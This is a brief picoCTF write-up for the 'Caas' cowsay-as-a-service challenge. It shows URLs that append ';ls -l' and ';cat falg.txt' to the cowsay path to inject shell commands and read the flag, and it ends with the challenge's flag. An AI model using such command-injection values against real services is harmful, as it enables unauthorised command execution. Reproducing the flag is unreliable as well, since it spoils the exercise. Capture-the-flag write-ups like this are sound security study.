# Picoctf

## Caas

### Solution

I started by going through both the Caas Websites [[1]](https://caas.mars.picoctf.net/) [[2]](https://caas.mars.picoctf.net/cowsay/message). And found nothing special in them. I downloaded the index.js file and found out that it is using the HTTP GET METHOD. After finding this out. I simply put another command 'ls' to list all the files and then opened falg.txt using cat 'cat falg.txt.

```
https://caas.mars.picoctf.net/cowsay/yoo
https://caas.mars.picoctf.net/cowsay/yoo;ls -l
https://caas.mars.picoctf.net/cowsay/yoo;cat%20falg.txt
```

flag: `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
